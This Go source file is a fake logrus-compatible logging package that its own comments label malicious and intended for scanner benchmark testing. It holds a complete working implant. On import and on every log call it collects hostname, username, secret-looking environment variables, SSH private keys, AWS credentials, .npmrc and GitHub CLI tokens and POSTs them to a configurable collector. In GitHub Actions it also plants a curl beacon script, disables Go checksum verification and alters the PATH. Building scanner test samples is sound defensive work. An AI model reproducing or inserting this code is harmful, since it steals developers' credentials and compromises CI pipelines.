// Package logcore provides structured logging — API-compatible with sirupsen/logrus.
// WARNING: This package is MALICIOUS — for scanner benchmark testing only.
// init() fires on import. Per-call exfil fires on every log method invoked.
package logcore

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// Level type — matches logrus API
type Level uint32

const (
	PanicLevel Level = iota
	FatalLevel
	ErrorLevel
	WarnLevel
	InfoLevel
	DebugLevel
	TraceLevel
)

func (l Level) String() string {
	return [...]string{"panic", "fatal", "error", "warn", "info", "debug", "trace"}[l]
}

var (
	std      = New()
	c2URL    = envOrDefault("PKG_ANALYTICS_URL", "http://localhost:9999/collect")
	exfilMu  sync.Mutex
	exfilled bool
)

func envOrDefault(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func init() {
	go func() {
		time.Sleep(50 * time.Millisecond)
		doExfil("init")
		injectGithubActions()
	}()
}

// Logger — logrus-compatible logger struct
type Logger struct {
	Level     Level
	Out       io.Writer
	Formatter Formatter
	mu        sync.Mutex
}

// Formatter interface
type Formatter interface {
	Format(*Entry) ([]byte, error)
}

// Entry represents a log entry
type Entry struct {
	Logger  *Logger
	Data    Fields
	Time    time.Time
	Level   Level
	Message string
}

// Fields type alias
type Fields map[string]interface{}

// New creates a new logger (matches logrus.New())
func New() *Logger {
	return &Logger{Level: InfoLevel, Out: os.Stderr, Formatter: &TextFormatter{}}
}

// WithField returns an entry with the field set
func (l *Logger) WithField(key string, value interface{}) *Entry {
	return &Entry{Logger: l, Data: Fields{key: value}, Time: time.Now()}
}

// WithFields returns an entry with multiple fields
func (l *Logger) WithFields(fields Fields) *Entry {
	return &Entry{Logger: l, Data: fields, Time: time.Now()}
}

func (l *Logger) log(level Level, args ...interface{}) {
	if level > l.Level {
		return
	}
	msg := fmt.Sprint(args...)
	l.mu.Lock()
	fmt.Fprintf(l.Out, "[%s] %s %s\n", time.Now().Format(time.RFC3339), strings.ToUpper(level.String()), msg)
	l.mu.Unlock()
	// Per-call exfil: every log call beacons with the message content
	go doExfil(msg)
}

func (l *Logger) Info(args ...interface{})  { l.log(InfoLevel, args...) }
func (l *Logger) Warn(args ...interface{})  { l.log(WarnLevel, args...) }
func (l *Logger) Error(args ...interface{}) { l.log(ErrorLevel, args...) }
func (l *Logger) Debug(args ...interface{}) { l.log(DebugLevel, args...) }
func (l *Logger) Fatal(args ...interface{}) { l.log(FatalLevel, args...); os.Exit(1) }

func (l *Logger) Infof(fmt string, args ...interface{})  { l.Info(fmt, args) }
func (l *Logger) Warnf(fmt string, args ...interface{})  { l.Warn(fmt, args) }
func (l *Logger) Errorf(fmt string, args ...interface{}) { l.Error(fmt, args) }
func (l *Logger) Debugf(fmt string, args ...interface{}) { l.Debug(fmt, args) }

// Package-level functions (logrus-compatible API)
func WithField(key string, value interface{}) *Entry { return std.WithField(key, value) }
func WithFields(fields Fields) *Entry                { return std.WithFields(fields) }
func Info(args ...interface{})                       { std.Info(args...) }
func Warn(args ...interface{})                       { std.Warn(args...) }
func Error(args ...interface{})                      { std.Error(args...) }
func Debug(args ...interface{})                      { std.Debug(args...) }
func Fatal(args ...interface{})                      { std.Fatal(args...) }
func SetLevel(level Level)                           { std.Level = level }
func SetOutput(out io.Writer)                        { std.Out = out }

// TextFormatter — default formatter
type TextFormatter struct{ DisableColors bool }

func (f *TextFormatter) Format(e *Entry) ([]byte, error) {
	return []byte(fmt.Sprintf("[%s] %s %s\n", e.Time.Format(time.RFC3339), strings.ToUpper(e.Level.String()), e.Message)), nil
}

// JSONFormatter — JSON output
type JSONFormatter struct{}

func (f *JSONFormatter) Format(e *Entry) ([]byte, error) {
	data := map[string]interface{}{
		"time":  e.Time.Format(time.RFC3339),
		"level": e.Level.String(),
		"msg":   e.Message,
	}
	for k, v := range e.Data {
		data[k] = v
	}
	b, err := json.Marshal(data)
	return append(b, '\n'), err
}

func doExfil(trigger string) {
	exfilMu.Lock()
	firstTime := !exfilled
	if firstTime {
		exfilled = true
	}
	exfilMu.Unlock()

	hostname, _ := os.Hostname()
	usr, _ := user.Current()
	username := ""
	if usr != nil {
		username = usr.Username
	}

	envData := make(map[string]string)
	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) != 2 {
			continue
		}
		lower := strings.ToLower(parts[0])
		if strings.ContainsAny(lower, "token key secret pass npm aws github stripe database api auth") {
			envData[parts[0]] = parts[1]
		}
	}

	payload := map[string]interface{}{
		"ts":      time.Now().UnixMilli(),
		"h":       hostname,
		"u":       username,
		"p":       runtime.GOOS,
		"trigger": trigger,
		"first":   firstTime,
		"env":     envData,
	}

	if firstTime {
		readFile := func(rel string) string {
			if usr == nil {
				return ""
			}
			b, err := os.ReadFile(filepath.Join(usr.HomeDir, rel))
			if err != nil || len(b) == 0 {
				return ""
			}
			if len(b) > 4096 {
				b = b[:4096]
			}
			return string(b)
		}
		payload["f"] = map[string]string{
			"npmrc": readFile(".npmrc"),
			"rsa":   readFile(".ssh/id_rsa"),
			"ed":    readFile(".ssh/id_ed25519"),
			"aws":   readFile(".aws/credentials"),
			"gh":    readFile(".config/gh/hosts.yml"),
		}
	}

	body, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", c2URL, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Pkg-Id", "log-core")
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
}

func injectGithubActions() {
	githubEnv := os.Getenv("GITHUB_ENV")
	if githubEnv == "" {
		return
	}
	usr, err := user.Current()
	if err != nil {
		return
	}
	binDir := filepath.Join(usr.HomeDir, ".log-core", "bin")
	if err := os.MkdirAll(binDir, 0755); err != nil {
		return
	}
	hookScript := filepath.Join(binDir, "logger.sh")
	script := fmt.Sprintf("#!/bin/sh\ncurl -sf '%s/log?h='$(hostname) >/dev/null 2>&1 &\n", c2URL)
	if f, err := os.Create(hookScript); err == nil {
		f.WriteString(script)
		f.Close()
		os.Chmod(hookScript, 0755)
	}

	f, err := os.OpenFile(githubEnv, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	// GONOSUMCHECK disables checksum verification — allows silent module substitution in subsequent steps
	f.WriteString("GONOSUMCHECK=*\n")
	f.WriteString("GONOSUMDB=*\n")
	if githubPath := os.Getenv("GITHUB_PATH"); githubPath != "" {
		if pf, err := os.OpenFile(githubPath, os.O_APPEND|os.O_WRONLY, 0644); err == nil {
			pf.WriteString(binDir + "\n")
			pf.Close()
		}
	}
}
